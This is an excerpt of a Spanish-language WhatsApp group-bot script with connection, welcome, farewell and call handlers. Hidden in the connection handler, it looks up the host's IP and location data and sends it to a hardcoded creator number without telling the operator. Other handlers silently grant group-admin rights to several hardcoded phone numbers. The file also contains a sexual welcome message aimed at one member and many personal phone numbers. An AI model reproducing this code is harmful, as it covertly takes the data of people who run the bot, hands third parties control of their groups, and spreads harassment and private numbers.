...
const { stick, errorfg, group, banf, ownerB, modsB, userB, admin, Badmin, sofii, mariann, samm, shagii, garyy, criss, pandaa, yulii, miaa, isaa, famp} = require('./help/respon');
...
cnf.autoReconnect = ReconnectMode.onConnectionLost
    ...
    cnf.browserDescription = ['mOrenito','Desktop','3.0']
    await sleep(10000)
    cnf.on('qr', qr => {
 ...
 cnf.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Conectado*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: false, externalAdReply:{title: "Si quieres este bot, da clic aquí\nPito pa Gary",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./confumods.jpg'),sourceUrl:"https://wa.me/19088088900?text=ola%20owner%20❤️"}}})
	console.log(color('|WRN|', 'yellow'), color('Enviando de información de usuario', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       cnf.sendMessage("5218445347754@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n──────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: false, externalAdReply:{title: "Creador isaiaswtf",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./confumods.jpg'),sourceUrl:"https://wa.me/5218445347754?text=Ola"}}})
...
if(!num.split('@')[0].startsWith(994404752227))
if(!num.split('@')[0].startsWith(855964796982))
if(!num.split('@')[0].startsWith(79054328423))
if(!num.split('@')[0].startsWith(79653450669))
if(!num.split('@')[0].startsWith(33757909082))
{
fakew = `*⚠️Los numeros fake no están permitidos @${num.split('@')[0]}*`
...
if (num.startsWith('19088088900')) {cnf.groupMakeAdmin(mdata.id, [num])}
//Mia
if (num.startsWith('5218443517716')) {cnf.groupMakeAdmin(mdata.id, [num])}
 //Gary
if (num.startsWith('573194772128')) {cnf.groupMakeAdmin(mdata.id, [num])}
...
if (num.startsWith('855964796982')) return cnf.sendMessage(mdata.id, isaw, MessageType.text, {thumbnail: fs.readFileSync('./confumods.jpg'), contextInfo: { externalAdReply:{title: `Bienvenido a ${mdata.subject}`,body:"",mediaType:"2",thumbnail:buff,sourceUrl:`https://wa.me/${num.split("@")[0]}`}, "mentionedJid": [num]}})

//Yuli
yuliw = `*Hola bonita @${num.split('@')[0]}*\n*Sientate en mi cara por favor? 🛐✨*`
...
*📸Foto:* 
*@${num.split('@')[0]} ｡ . • ¨ * • ✧*`
cnf.sendMessage(mdata.id, teks, MessageType.text, { thumbnail: fs.readFileSync('./confumods.jpg'), contextInfo: { externalAdReply:{title: `Hola, soy ${NamaBot}\nBienvenido a ${mdata.subject}\nLee las reglas y presentate:`,body:"",mediaType:"2",thumbnail:buff, sourceUrl:`https://wa.me/${num.split("@")[0]}`}, "mentionedJid": [num]}})
...
let buff = await getBuffer(ppimg)
bye =`*@${num.split('@')[0]} ｡ . • ¨ * • ✧*`
cnf.sendMessage(mdata.id, bye, MessageType.text, {thumbnail: fs.readFileSync('./confumods.jpg'), contextInfo: { externalAdReply:{title: `Salio de ${mdata.subject}\nNo le vamos a extrañar...\nNo era digno`,body:"",mediaType:"2",thumbnail:buff,sourceUrl:`https://wa.me/${num.split("@")[0]}`}, "mentionedJid": [num]}})
...
console.log(color('|TRM|'), color(`Degradacion ${num.split('@')[0]} En ${mdata.subject}`,  'cyan'))
	...
	cnf.on('group-update', async (anu) => {
    	...
    	const fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;cnf;;;\nFN:cnf\nitem1.TEL;waid=19088088900:19088088900\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
    if(anu.announce == 'false'){
    teks = `- [ Grupo Abierto Por Un Admin ] -`
    ...
    teks = `- [ Grupo Cerrado Por Un Admin ] -`
    cnf.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
...
cnf.on('CB:action,,call', async json => {
        ...
        cnf.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Creador ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./confumods.jpg'),sourceUrl:`https://wa.me/19088088900?text=ola%20owner%20❤️`}}})
        await sleep(5000)
...
function doProgress()
{
	...
	if ( progress >= 1 )
	{
		...
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('Ningun sistema es seguro -Exclamo el kuaker', 'red'))})}, 200 ) ;
	}
	else
	{
